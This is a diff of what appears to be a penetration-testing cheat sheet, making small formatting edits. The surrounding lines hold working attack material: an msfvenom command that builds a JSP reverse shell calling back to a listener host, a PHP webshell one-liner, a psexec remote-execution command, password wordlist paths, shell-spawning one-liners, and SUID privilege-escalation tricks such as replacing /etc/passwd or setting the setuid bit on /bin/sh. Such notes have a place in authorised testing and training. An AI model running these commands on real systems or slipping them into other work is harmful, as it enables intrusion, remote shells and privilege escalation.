@@ -745,7 +745,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme
 #### Webshells
 ``` /usr/share/webshells/```
 
-``` Pikachu.gif.php```:
+``` Pikachu.gif.php```
 
 ``` <? php echo system($_REQUEST['cmd']); ?>```
 
@@ -800,6 +800,8 @@ psexec.py user:passwd@10.10.10.152 -c python <cmd>
 /usr/share/seclists/Passwords/probable-v2-top (207-12000)
 /usr/share/wordlists/dirb/common.txt (4614)
 /usr/share/wordlists/nmap.lst (5084)
+
+/usr/share/wordlists/rockyou.txt (too much)
 /usr/share/wordlists/metasploit/password.lst (88396)
 
 ```
@@ -832,6 +834,7 @@ fg+ENTER
 python -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
+
 perl —e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
@@ -841,11 +844,13 @@ lua: os.execute('/bin/sh')
 #### SUID Privileged Binaries
 ```
 cp,mv: replace /etc/passwd to add a user or SSH key.
+
 less,more: !bash
-man man: !bash
+man: !bash
 expect: spawn /bin/bash; bash
 awk: 'BEGIN {system("/bin/sh")}'
 echo: hello; chmod u+s /bin/sh
+
 Text Editors:
 exec "/bin/sh" (IRB)
 :!bash (vi)
